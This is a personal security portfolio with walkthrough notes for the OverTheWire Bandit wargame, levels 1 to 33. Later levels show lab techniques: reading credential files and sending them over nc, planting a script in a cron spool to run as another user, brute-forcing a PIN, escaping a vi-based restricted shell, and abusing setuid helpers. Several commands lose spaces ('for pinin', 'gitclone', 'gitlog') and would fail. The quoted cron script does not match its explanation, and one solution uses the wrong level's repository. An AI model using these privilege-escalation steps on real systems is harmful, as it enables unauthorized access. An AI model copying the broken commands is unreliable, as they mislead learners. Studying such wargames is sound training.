docs.title: About Me
docs.text:
Hi, I'm a cybersecurity enthusiast with a primary focus on offensive security, penetration testing, and security assessment. Through hands-on laboratories, Capture The Flag challenges, and independent research, I continuously develop practical skills in identifying, exploiting, and documenting security vulnerabilities across Linux, Windows, web applications, and Active Directory environments.

While offensive security is my primary area of interest, I view penetration testing as a means of improving defensive security rather than simply compromising systems. My long-term objective is to work in a Purple Team environment where offensive techniques directly contribute to stronger detections, improved monitoring, and more resilient security architectures.

This portfolio documents that journey through professional client-style penetration test reports, technical walkthroughs, and research notes.

docs.title: My Approach
docs.text:
I believe technical ability is only one part of penetration testing.

A successful penetration test should clearly demonstrate:

  • how a vulnerability was identified,
  • why it exists,
  • its potential business impact,
  • and how it should be remediated.

For that reason, every penetration test report within this portfolio follows a standardized methodology inspired by professional client deliverables rather than traditional CTF writeups.

Equally important is understanding the defensive perspective. Every finding includes remediation guidance, encouraging a mindset that extends beyond exploitation toward improving detection capabilities, hardening systems, and reducing organizational risk. My goal is to bridge offensive and defensive security by producing reports that are technically accurate, actionable, and valuable to both security teams and stakeholders.

docs.title: About This Portfolio
docs.text:
This portfolio serves as a practical demonstration of my technical skills, methodology, and approach to cybersecurity.

It contains:

  • Professional client-style penetration test reports
  • Technical walkthroughs from TryHackMe laboratories
  • Linux practice notes from OverTheWire Bandit
  • Personal research and documentation

Every penetration test report follows a consistent reporting standard and includes:

  • Executive Summary
  • Risk Assessment
  • Technical Walkthrough
  • Supporting Evidence
  • Business Impact
  • Practical Remediation Recommendations

Unlike traditional CTF writeups, these reports are written to resemble professional penetration testing deliverables, emphasizing not only technical exploitation but also communication, documentation quality, and actionable remediation guidance. The goal is to demonstrate both offensive capability and the ability to translate technical findings into meaningful improvements for defensive security teams.

docs.title: Security Philosophy
docs.text:
Offensive security is most valuable when it improves defensive security.

Every assessment included in this portfolio focuses not only on identifying vulnerabilities, but also on understanding why they exist, evaluating their potential impact, and providing practical remediation guidance.

I believe effective cybersecurity professionals should understand both how systems are compromised and how they can be monitored, hardened, and defended. This portfolio reflects that philosophy by combining realistic attack simulation with standardized reporting, defensive recommendations, and a strong emphasis on improving an organization's overall security posture.

docs.title: Disclaimer
docs.text:
All assessments and walkthroughs published on this website were conducted exclusively against intentionally vulnerable laboratory environments, including TryHackMe, OverTheWire, and other authorized training platforms.

The reports have been rewritten into a professional penetration testing format for educational purposes and to demonstrate technical proficiency, documentation quality, and security reporting methodology. No unauthorized testing was performed against production systems.

docs.title: OverTheWire Bandit Notes From Levels 1 Through 10
OverTheWire Bandit Notes From Levels 1 Through 10
docs.text: These are my personal notes and solutions while practicing Linux fundamentals through the OverTheWire Bandit wargame.

docs.title: Challenge
docs.text: The password for the next level is stored in a file called - located in the home directory.

docs.title: Explanation
docs.text:
A filename containing only - can cause confusion because many Linux commands interpret - as STDIN/STDOUT (/dev/stdin, /dev/stdout).

To reference the file correctly, its path needs to be specified explicitly.

docs.title: Solution
docs.text:
cat ./-

./ tells the shell that - is a file in the current directory rather than a command option.

docs.title: Challenge
docs.text:
The password for the next level is stored in a file called:

--spaces in this filename--

docs.title: Problem
docs.text:
The filename begins with --, which most commands interpret as an option flag rather than a filename.

Example error:

cat --spaces in this filename--

Output:

cat: unrecognized option '--spaces in this filename--'

docs.title: Option 1 — Stop option parsing
docs.text:
cat -- --spaces\ in\ this\ filename--

Explanation:

  • -- tells the command to stop parsing options.
  • \ escapes the spaces.

docs.title: Option 2 — Quote the filename
docs.text: cat "./--spaces in this filename--"

docs.title: Challenge
docs.text: The password for the next level is stored in a hidden file in the inhere directory.

docs.title: Solution
docs.text:
cd inhere
ls -la

Explanation:

  • ls -la lists all files, including hidden ones (files beginning with .).

docs.title: Challenge
docs.text: The password for the next level is stored in the only human-readable file in the inhere directory.

docs.title: Approach
docs.text:
1. Enter the directory:
cd inhere
  1. Check file types:
file ./*

Example output:

./-file00: data
./-file01: data
./-file02: data
./-file03: data
./-file04: data
./-file05: data
./-file06: data
./-file07: ASCII text
./-file08: data
./-file09: data

Only -file07 contains readable text.

docs.title: Solution
docs.text: cat ./-file07

docs.title: Challenge
docs.text:
The password is stored in a file under the inhere directory with these properties:

  • human-readable
  • exactly 1033 bytes
  • not executable

docs.title: Solution
docs.text:
find inhere -type f -size 1033c ! -executable -print0 | \
xargs -0 file | \
awk -F: '/text/{print $1; exit}' | \
xargs -I{} cat "{}"

docs.title: Explanation
docs.text:
find

find inhere -type f -size 1033c ! -executable

Searches for:

  • regular files
  • size exactly 1033 bytes
  • not executable

xargs -0 file

Checks the type of each file.

awk

awk -F: '/text/{print $1; exit}'

Finds the first file that contains human-readable text.

cat

Prints the password.

docs.title: Challenge
docs.text:
The password is stored somewhere on the server with these properties:

  • owned by user bandit7
  • owned by group bandit6
  • 33 bytes in size

docs.title: Solution
docs.text: find / -type f -user bandit7 -group bandit6 -size 33c -print0 -quit 2>/dev/null | xargs -0 cat

docs.title: Explanation
docs.text:
find

/ -type f

Searches the entire filesystem for regular files only.

-user bandit7
-group bandit6

Matches ownership.

-size 33c

File size is 33 bytes.

-print0

Outputs filenames separated by NULL characters (safe for spaces).

-quit

Stops searching after the first match.

2>/dev/null

Suppresses permission errors.

xargs -0 cat

Reads the filename and prints its contents.

docs.title: Challenge
docs.text: The password is stored in data.txt next to the word millionth.

docs.title: Solution
docs.text:
grep "millionth" data.txt

Example output:

millionth abcdefghijklmnopqrstuvwxyz

The value next to millionth is the password.

docs.title: Option 2 - Automatic extraction
docs.text:
grep "millionth" data.txt | awk '{print $2}'

Explanation:

  • grep finds the line
  • awk prints the second field

docs.title: Challenge
docs.text: The password is the only line that occurs once in data.txt.

docs.title: Solution
docs.text: sort data.txt | uniq -u

docs.title: Explanation
docs.text:
sort data.txt

Sorts the file so identical lines become adjacent.

uniq -u

Prints lines that appear only once.

docs.title: Challenge
docs.text: The password is in data.txt inside one of the few human-readable strings, preceded by several = characters.

docs.title: Solution
docs.text: strings data.txt | grep ===

docs.title: Explanation
docs.text:
strings

Extracts readable text from binary data.

grep ===

Searches for lines containing ===, which precede the password.

docs.title: Challenge
docs.text: The password in data.txt is Base64 encoded.

docs.title: Solution
docs.text:
base64 --decode data.txt

or

base64 -d data.txt

docs.title: Alternative (using OpenSSL)
docs.text: openssl base64 -d -in data.txt

docs.title: If the output looks binary
docs.text:
base64 -d data.txt 2>/dev/null | strings

This extracts only the human-readable text.

docs.title: OverTheWire Bandit Notes From Levels 11 Through 20
OverTheWire Bandit Notes From Levels 11 Through 20
docs.text: These are my personal notes and solutions while practicing Linux fundamentals through the OverTheWire Bandit wargame.

docs.title: Challenge
docs.text: • The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions.

docs.title: Problem
docs.text: The data is encoded with ROT13 (a simple Caesar cipher shifting letters by 13 positions).

docs.title: Solution
docs.text: tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt

docs.title: Explanation
docs.text:
• tr = translate characters
  • 'A-Za-z' = input character set (all uppercase and lowercase letters)
  • 'N-ZA-Mn-za-m' = output character set rotated by 13 positions

docs.title: Mapping Example
docs.text:
• A → N, B → O, ..., N → A
  • a → n, b → o, ..., n → a

The < data.txt part feeds the file as input to tr.

This prints the decoded text directly — the password appears in cleartext in the output.

docs.title: Challenge
docs.text: • The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work. Use mkdir with a hard to guess directory name. Or better, use the command “mktemp -d”. Then copy the datafile using cp, and rename it using mv (read the manpages!)

docs.title: 1️⃣ Create a temporary working directory
docs.text:
It’s best to not work directly in the home directory, so a safe temporary folder is created:

tmpdir=$(mktemp -d)
cd "$tmpdir"
  • mktemp -d → creates a directory with a random, hard-to-guess name.
  • tmpdir=$(...) → stores its path in a variable.
  • cd "$tmpdir" → switch to that directory.

docs.title: 2️⃣ Copy the data.txt file
docs.text:
From the Bandit home directory:

cp /home/bandit12/data.txt .

docs.title: 3️⃣ Rename the file
docs.text:
The file is a hexdump, so it should be renamed to a binary file before processing:

mv data.txt data.bin
  • mv → renames the file.
  • Now data.bin will be the working file.

docs.title: 4️⃣ Convert the hexdump back to binary
docs.text:
Bandit hints that data.txt is a hexdump, probably generated by xxd. To restore the original binary:

xxd -r data.bin > data.orig
  • xxd -r → reverses a hex dump back into binary.
  • data.orig → now a binary file (likely a compressed archive).

docs.title: 5️⃣ Decompress repeatedly
docs.text:
Now, the tricky part: the file has been repeatedly compressed, often alternating formats like gzip and bzip2. It is therefore necessary to be decompressing it in a loop:

file data.orig
  • This displays the current file type (gzip, bzip2, tar, etc.).

Then the appropriate command is used:

  • For gzip:

    mv data.orig data.gz
gunzip data.gz

  • For bzip2:

    mv data.orig data.bz2
bunzip2 data.bz2

  • For tarballs:

    tar xf data.tar

The file and the decompress step needs to be repeated until file reports a plain text file.

docs.title: 6️⃣ Read the password
docs.text:
Once the file is finally plain text, just:

cat <filename>

docs.title: Challenge
docs.text: • The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on.

docs.title: Solution
docs.text:
• 1️⃣ The private key needs to be copied onto the local machine
  • 2️⃣ and saved locally, for example:
nano /tmp/bandit14_key
# paste the key
chmod 600 /tmp/bandit14_key
-> SSH from the local machine to the Bandit server on the special port (2220): 
ssh -i /tmp/bandit14_key -p 2220 bandit14@bandit.labs.overthewire.org
  • The login is done as bandit14.
  • Then the password can be read:
cat /etc/bandit_pass/bandit14

docs.title: Challenge
docs.text: • The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.

docs.title: Solutiuon
docs.text:
Send the password of bandit14 to port 30000 on localhost:

cat /etc/bandit_pass/bandit14 | nc localhost 30000
  • cat /etc/bandit_pass/bandit14 → reads the password of the current level, which is bandit14’s password.
  • The pipe | → sends that password as input to the next command.
  • nc localhost 30000 → connects to TCP port 30000 on the local machine and sends whatever is piped in (bandit14’s password).
  • The server listening on port 30000 receives your password, verifies it, and responds with the next level’s password (bandit15).

docs.title: Explanation
docs.text:
• Bandit 14’s level challenge is specifically set up to require the current level password to be sent to this service.
  • Only bandit14 can read /etc/bandit_pass/bandit14 because of Linux file permissions.
  • Port 30000 is a little “mini server” running locally that expects the current password on stdin and responds with the next password.

docs.title: Troubleshooting common mistakes
docs.text:
• Trying to do this as a different user (bandit13, bandit15, etc.) → fails because you can’t read the password file.
  • Forgetting the pipe → nc won’t receive anything to check.
  • Forgetting a newline → some services require the password to end with \n (though usually cat adds it automatically).****

docs.title: Challenge
docs.text: • The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL/TLS encryption.

docs.title: Solution
docs.text:
Variant A: pipe the password into openssl 

printf "%s\n" "$(cat /etc/bandit_pass/bandit15)" | openssl s_client -connect localhost:30001 -quiet 2>/dev/null

or

Variant B: redirect the password file to openssl 

openssl s_client -connect localhost:30001 -quiet < /etc/bandit_pass/bandit15 2>/dev/null

docs.title: Explanation
docs.text:
• cat /etc/bandit_pass/bandit15 (or the printf wrapper) : reads your current-level password and ensures a trailing newline.
  • | or < : sends that password to the TLS client’s stdin.
  • openssl s_client -connect localhost:30001 : opens an SSL/TLS connection to localhost port 30001.
  • quiet : suppresses some of s_client’s verbose session chatter.
  • 2>/dev/null : hides remaining diagnostic output (cert info etc.), leaving you with the server response (the next password).

docs.title: Challenge
docs.text: • The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL/TLS and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.

docs.title: Explanation (summary of steps)
docs.text:
1. Discover listening ports in range 31000–32000.
  2. nmap was used to find which ports in that range had services listening. nmap -p 31000-32000 showed five open ports: 31046 31518 31691 31790 31960.
 PORT STATE SERVICE 

  31046/tcp open unknown

  31518/tcp open unknown 

  31691/tcp open unknown 

  31790/tcp open unknown 

  31960/tcp open unknown
  1. Probe each port to find which speak TLS vs plain TCP.
  2. openssl s_client handshake tests indicated 31518 and 31790 are TLS services (they returned certificate info), while the others behaved like plain TCP echo services.

TLS handshake probe (fast, non-blocking)

timeout 2 bash -c 'echo | openssl s_client -connect 127.0.0.1:PORT 2>&1' | sed -n '1,6p'
  • If output contains CONNECTED or ----BEGIN CERTIFICATE----- it’s TLS. → The output from this command showed two ports running TSL certificates. The responses were as such: 
    bandit16@bandit:~$ timeout 2 bash -c 'echo | openssl s_client -connect 127.0.0.1**:31518** 2>&1' | sed -n '1,6p' Can't use SSL_get_servername depth=0 CN = SnakeOil verify error:num=18:self-signed certificate verify return:1 depth=0 CN = SnakeOil verify return:1

MEANING:

  • 31518 and 31790 — output shows a certificate (depth=0 CN = SnakeOil) → these are TLS services.

  • 31046, 31691, 31960 — output shows CONNECTED and no peer certificate available / unexpected message → openssl connected at TCP level but the peer did not perform a TLS handshake, so these are plain (non-TLS) TCP services (often echo servers that speak plain text).

  • Send the current password to each candidate over the correct protocol.

  • For TLS ports the openssl s_client was used and the password was piped into it; for plain TCP nc would be used.
  • Each echo server simply returned the same password back. The correct server returned a different single-line response — that different string is the next-level password.
PASS="$(cat /etc/bandit_pass/bandit16)"; for p in 31518 31790; do echo "---- $p ----"; printf "%s\n" "$PASS" | timeout 3 bash -c "openssl s_client -connect 127.0.0.1:$p -quiet 2>/dev/null" | sed -n '1,8p'; done

docs.title: Line-by-line explanation
docs.text:
PASS="$(cat /etc/bandit_pass/bandit16)"; for p in 31518 31790; do echo "---- $p ----"; printf "%s
" "$PASS" | timeout 3 bash -c "openssl s_client -connect 127.0.0.1:$p -quiet 2>/dev/null" | sed -n '1,8p'; done
- PASS="$(cat /etc/bandit_pass/bandit16)" - Reads the current-level password from the file into the shell variable PASS. - Using $(...) captures the command output exactly (no extra newlines beyond what the file has). Storing it in a variable lets us reuse it easily.
  • ;

  • Separator so the for loop can be ran next on the same command line.

  • for p in 31518 31790; do ...; done

  • A shell loop that runs the inner block once for each port (p) listed. These were the two ports that were detected earlier as TLS-capable.

  • echo "---- $p ----"

  • Prints a small header so the outputs from different ports are easy to distinguish.

  • printf "%s " "$PASS"

  • Prints the password followed by a newline.

  • printf is used instead of echo because it is consistent and won’t reinterpret escape sequences or change behavior with odd characters. The ensures the remote service receives a newline (like pressing Enter).

  • |

  • Pipes the printed password into the stdin of the next command. So the password becomes the input to openssl s_client.

  • timeout 3 bash -c "openssl s_client -connect 127.0.0.1:$p -quiet 2>/dev/null"

  • timeout 3 — ensures the whole openssl attempt will be killed after 3 seconds if it hangs (avoids you waiting forever).
  • bash -c "..." — runs the quoted command string in a shell (timeout wraps the whole openssl invocation reliably).
  • openssl s_client -connect 127.0.0.1:$p -quiet — opens an SSL/TLS connection to the local port p, reads from stdin (the password that was piped) and sends it over the TLS channel. quiet suppresses most of openssl's verbose handshake text so the server reply is easier to read.

  • 2>/dev/null — discards openssl's diagnostic output (stderr), leaving only the server response on stdout (which is what we want to inspect).

  • | sed -n '1,8p'

  • Pipes the server response into sed and prints only the first 8 lines. This prevents huge or noisy responses from cluttering the terminal and surfaces the likely single-line password which is usually at the top.

Data flow:

password file → printf → pipe → openssl s_client (TLS connect to server) → server responds → sed prints first lines.

  1. Identify the correct response.
  2. The returned outputs were inspected; the one that differed from what was sent (and looked like a Bandit password/token) was taken as the bandit17 password.

docs.title: Challenge
docs.text: • There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new

docs.title: Problem
docs.text:
There is:

  • passwords.old
  • passwords.new

The password that is needed is the only line that differs between the two files.

docs.title: Solution
docs.text:
diff:

diff passwords.old passwords.new
This will show output like:

< oldpasswordline
> newpasswordline

The line with the greater-than sign (>) is the one from passwords.new.

-> That is the password for bandit18.

Option B: To show only the new line: 

diff passwords.old passwords.new | grep ">"

## Explanation - The challenge states exactly one line changed. - diff compares each line in both files. - The changed line in passwords.new is the new password.

docs.title: Challenge
docs.text: The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.

docs.title: Problem
docs.text: Normally we log in via SSH and get a shell. But here, .bashrc in the home directory is set up to log you out immediately. So we cannot interactively log in in the usual way.

docs.title: 1. Run a command directly via SSH
docs.text:
Instead of opening a shell, a command can be ran directly: 

ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme
- This logs in, executes cat readme without running .bashrc interactively, and prints the password.

## Explanation When a command is passed to SSH, it doesn’t start an interactive shell. .bashrc is only sourced for interactive shells.

docs.title: 2. Use scp to copy the file locally
docs.text:
scp -P 2220 bandit18@bandit.labs.overthewire.org:readme .
cat readme
- This copies the file to the local machine and can be then read safely.

docs.title: 3. Temporary safe shell via ssh -t
docs.text:
If a shell is needed for more exploration, .bashrc can be bypassed like this: 

ssh bandit18@bandit.labs.overthewire.org -p 2220 'bash --noprofile --norc'
- -norc prevents .bashrc from running.

docs.title: Summary
docs.text:
• .bashrc logs us out on this level.
  • Solution: don’t start an interactive shell. Run the command directly: cat readme or scp it out.
  • The readme file contains the password for bandit19.

docs.title: Challenge
docs.text: To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.

docs.title: Problem
docs.text:
There a setuid binary in the home directory - This binary runs as user bandit20, even though we are logged in as bandit19. - It must be used to read the file: 

/etc/bandit_pass/bandit20

which normally cannot be read.

---

docs.title: Solution
docs.text:
1. Check the files: 
    ls -l
    Output :
total 16
-rwsr-x--- 1 bandit20 bandit19 14884 Oct 14 09:26 bandit20-do

The important part:

  • s ⇒ setuid bit, meaning:

  • When it's ran, it runs with bandit20’s permissions.

  • Use the setuid binary to read the password

The trick is to give it a command that reads the password file. Example: 

./bandit20-do cat /etc/bandit_pass/bandit20
Because the binary runs as bandit20, the cat command has permission to read the file. This switches the identity to bandit20.

docs.title: Challenge
docs.text: There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).

docs.title: Problem - What the setuid binary does
docs.text:
Inside the home directory:

-rwsr-x--- 1 bandit21 bandit20 14876 ... suconnect

This binary runs as bandit21 because of the s (setuid).

If: 

./suconnect <port>

it:

  1. connects to localhost:<port>
  2. waits for us to send one line of text
  3. compares the line to the bandit20 password
  4. if correct, it sends the bandit21 password through that same connection

This means:

  • A listening port must be created (like a server)
  • The binary will connect to us
  • We send it the bandit20 password

  • It will respond with the bandit21 password

docs.title: Solution
docs.text:
Step 1 — Pick an unused port

Pick a port > 1024 (only root can use ports < 1024).

Step 2 — Start a listener 

nc -lvp 12345

This means: - l = listen - v = verbose - p = port number

Leave this running — it waits for connections.

Step 3 — In another terminal (or a second login), run the setuid binary Open a second terminal and SSH into bandit20 again. 

./suconnect 12345

This will: - connect to the listener - expect the bandit20 password to be sent

Step 4 — Send the bandit20 password

In the first terminal (the listener), paste the bandit20 password and press Enter.

docs.title: Summary
docs.text:
1. Terminal 1 

    nc -lvp 12345

  2. Terminal 2

./suconnect 12345

  1. Terminal 1

    Paste the bandit20 password

  2. Terminal 1

Receive the bandit21 password

docs.title: OverTheWire Bandit Notes From Levels 21 Through 33
OverTheWire Bandit Notes From Levels 21 Through 33
docs.text: These are my personal notes and solutions while practicing Linux fundamentals through the OverTheWire Bandit wargame.

docs.title: Challenge
docs.text: A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

docs.title: Solution
docs.text:
Step 1 - List the directory:

ls /etc/cron.d

Step 2 — Read the cronjob file

Look at its contents:

cat /etc/cron.d/cronjob_bandit22

@reboot bandit22 /usr/bin/cronjob_bandit22.sh
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh

That means:

  • Every minute, as user bandit22, cron runs the script:
/usr/bin/cronjob_bandit22.sh

Step 3 — Read the script

Inspect the script:

cat /usr/bin/cronjob_bandit22.sh

#!/bin/bash
chmod 644 /tmp/bandit22_pass
cat /etc/bandit_pass/bandit22 > /tmp/bandit22_pass

Step 4 — Read the file that cron writes

Since cron runs this script every minute as user bandit22, it writes the password into /tmp with open permissions.

Look in /tmp:

ls -l /tmp

Look for a file mentioned in the script. Then read it:

cat /tmp/bandit22_pass

That printed value is the password for bandit22

docs.title: Explanation - Why this works
docs.text:
• Cron runs the script as bandit22, which means the script can read /etc/bandit_pass/bandit22
  • The script copies that password into /tmp, which we can access
  • The output file can be simply read

docs.title: Challenge
docs.text: A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.

docs.title: Solution summary
docs.text:
# 1) inspect cron and the script
cat /etc/cron.d/cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh

# 2) compute the exact filename cron will create (script's behavior)
hash=$(echo "I am user bandit23" | md5sum | cut -d' ' -f1)

# 3) remove any leftover file you might have created by mistake
rm -f /tmp/"$hash"

# 4) wait up to 60s for cron to run, then print the password file
sleep 65
cat /tmp/"$hash"

docs.title: 1) See what cron is configured to run
docs.text: cat /etc/cron.d/cronjob_bandit23

docs.title: 2) Read the script
docs.text:
cat /usr/bin/cronjob_bandit23.sh

The script does:

  • sets myname=$(whoami) (so when cron runs it, myname=bandit23)
  • computes mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
  • writes the password for $myname into /tmp/$mytarget

So cron will create a file /tmp/<md5-of-"I am user bandit23"> containing the bandit23 password.

docs.title: 3) Compute the exact filename cron will use (use the same echo as the script)
docs.text:
echo "I am user bandit23" | md5sum | cut -d' ' -f1

Save it:

hash=$(echo "I am user bandit23" | md5sum | cut -d' ' -f1)
echo "$hash"

docs.title: 4) Remove any conflicting file that could have been created earlier
docs.text:
If the script had been previously ran manually, we may have created /tmp/<hash> owned by our user, which prevents cron from writing the real file. Remove that file so cron can create it:

rm -f /tmp/"$hash"

docs.title: 5) Wait for cron and then read the file
docs.text:
Cron runs the script once per minute. Wait up to ~60 seconds, then read the file:

sleep 65
cat /tmp/"$hash"

That output is the password for bandit23.

docs.title: Level 23
docs.text:
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

docs.title: Goal:
docs.text:
Exploit a cron job run as bandit24 that executes any scripts found in:

/var/spool/bandit24/foo

place a malicious script in that directory -> cron runs it as bandit24 -> the script then reads the password file for bandit24 and writes it somewhere accessible.

docs.title: Solution
docs.text:
View the cron job

cd /etc/cron.d
ls -l

cronjob_bandit24

cat cronjob_bandit24

* * * * * bandit24 /usr/bin/cronjob_bandit24.sh

Read the script

cat /usr/bin/cronjob_bandit24.sh

#!/bin/bash

for i in /var/spool/bandit24/foo/*; do
    if [ -f "$i" ]; then
        echo "Running $i..."
        touch /tmp/$i
        rm -f "$i"
    fi
done

Interpretation:

  • Every minute, as user bandit24, cron checks /var/spool/bandit24/foo/
  • For every file inside:
    • It runs it
    • Then deletes it

Create the exploit script

Create a writable working directory:

cd /tmp
mkdir exploit23
cd exploit23

Create the script:

nano myscript.sh

#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/b24pass

Save & exit.

Make it executable

chmod +x myscript.sh

Copy it to the cron execution folder

cp myscript.sh /var/spool/bandit24/foo/

-> This folder is writable by bandit23, but scripts run as bandit24.

WAIT 1 minute

Cron only runs once per minute.

Wait:

sleep 65

Read the password dumped by your script

cat /tmp/b24pass

docs.title: Challenge
docs.text:
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

You do not need to create new connections each time

docs.title: Problem
docs.text:
A daemon on localhost:30002 returns the password for bandit25 if it receives:

  • the correct bandit24 password
  • a 4-digit numeric PIN
  • both on one line, separated by a space

There is no way to retrieve the PIN except brute-forcing all 10,000 combinations.

docs.title: Solution summary
docs.text:
pass=$(cat /etc/bandit_pass/bandit24); \
for pinin $(seq -w 0000 9999);do \
echo"$pass$pin"; \
done | nc localhost 30002

docs.title: Explanation
docs.text:
1. Read the password once

    pass=$(cat /etc/bandit_pass/bandit24)

  2. Generate all PINs

    seq -w 0000 9999
    • w ensures zero-padding (0000 → 9999).
    • Send correct input format
    echo"$pass$pin"

    Password and PIN are sent on one line, separated by a space.

  3. Pipe everything into a single nc session

    ... | nc localhost 30002

    This keeps the connection open while all combinations are tried.

  4. Daemon responds when the correct PIN is reached

    Correct!
The passwordfor user bandit25is ...

docs.title: Challenge
docs.text:
Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.

NOTE: if you’re a Windows user and typically use Powershell to ssh into bandit: Powershell is known to cause issues with the intended solution to this level. You should use command prompt instead.

docs.title: Problem
docs.text:
cat /etc/passwd | grep bandit26

Output:

bandit26:...:/home/bandit26:/usr/bin/showtext

bandit26 uses /usr/bin/showtext instead of /bin/bash.

docs.title: What /usr/bin/showtext does
docs.text:
• showtext displays text using vi
  • This creates a restricted shell environment
  • We are inside a text editor

docs.title: Solution
docs.text:
Why this can work

vi allows:

  • Command execution
  • Shell spawning
  • Environment modification

-> If we can execute commands inside vi, we can escape the restricted shell

docs.title: Escape Procedure
docs.text:
Inside vi:

:set shell=/bin/bash
:shell

This spawns a real Bash shell.

docs.title: Backup Escape Method
docs.text:
If :shell is blocked:

:! /bin/bash

docs.title: Final Step
docs.text:
Once a shell is received:

cat /etc/bandit_pass/bandit26

docs.title: Challenge
docs.text: Good job getting a shell! Now hurry and grab the password for bandit27!

docs.title: Solution
docs.text: • In bandit26’s home directory, there is a SUID binary:

docs.title: What the binary does
docs.text:
• bandit27-do is a helper program that:
    • Takes a command as input
    • Executes that command as bandit27

The SUID binary can be used to read the next password file:

./bandit27-docat /etc/bandit_pass/bandit27

docs.title: Challenge
docs.text:
There is a git repository at ssh://bandit27-git@bandit.labs.overthewire.org/home/bandit27-git/repo via the port 2220. The password for the user bandit27-git is the same as for the user bandit27.

From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.

docs.title: Solution
docs.text:
1. cd ~/Desktop
  1. Clone the repository via SSH
gitclone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
  1. Enter the cloned repository
cd repo
  1. List repository contents
ls -la
  1. Read the password for bandit28
cat README

docs.title: Challenge
docs.text:
There is a git repository at ssh://bandit28-git@bandit.labs.overthewire.org/home/bandit28-git/repo via the port 2220. The password for the user bandit28-git is the same as for the user bandit28.

From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.

docs.title: Solution
docs.text:
1. Clone the repository
gitclone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo
cd repo
  1. Check the current files
cat README.md
  • Password is hidden or replaced (e.g. xxxxxxxxxx)
  • Indicates a possible info leak fixed later
  1. View commit history
gitlog

Purpose:

  • See all commits
  • Identify commits with messages like:
    • add missing data
    • fix info leak
  • These often indicate where secrets were added or removed
  1. Inspect earlier commits
git show <commit_hash>

This shows:

  • The commit message
  • The diff
  • Lines removed ()
  • Lines added (+)

docs.title: Challenge
docs.text: There is a git repository at ssh://bandit29-git@bandit.labs.overthewire.org/home/bandit29-git/repo via the port 2220. The password for the user bandit29-git is the same as for the user bandit29.

docs.title: Solution
docs.text:
1. Clone the repository
gitclone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo
cd repo
  1. Inspect the default branch
cat README.md

Result:

  • No password
  • Message suggests credentials were removed from production
  1. Enumerate all branches
git branch -a

Found:

  • master
  • origin/dev
  • origin/sploits-dev

This indicates additional development branches exist.

  1. Switch to the development branch
git checkout dev

This creates a local branch tracking origin/dev.

  1. Explore repository contents
ls
cat README.md

docs.title: Challenge
docs.text:
There is a git repository at ssh://bandit30-git@bandit.labs.overthewire.org/home/bandit30-git/repo via the port 2220. The password for the user bandit30-git is the same as for the user bandit30.

From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.

docs.title: Solution
docs.text:
1. Clone the repository (from local machine)
gitclone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo
cd repo
  1. Inspect repository contents
ls
cat README.md

The README did not contain the password.

  1. Inspect full Git history (including all branches)
gitlog --all

This revealed:

  • multiple commits
  • additional remote branches (dev, sploits-dev)
  1. List all branches
git branch -a
  1. Check out the development branch
git checkout dev

New directories appeared.

  1. Explore repository files
ls
cd <new_directory>
cat README.md

Password for bandit30 was stored in a README file inside a non-master branch.

docs.title: Challenge
docs.text:
There is a git repository at ssh://bandit31-git@bandit.labs.overthewire.org/home/bandit31-git/repo via the port 2220. The password for the user bandit31-git is the same as for the user bandit31.

From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.

docs.title: Solution
docs.text:
1. Clone the repository (local machine)
gitclone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo
cd repo
  1. Read instructions
cat README.md
  1. Create the required file
echo"May I come in?" > key.txt
  1. Inspect .gitignore
cat .gitignore

Output:

*

All files are ignored by default.

  1. Force-add the file
git add -f key.txt
  1. Commit changes
git commit -m"add key"
  1. Push to remote
git push origin master

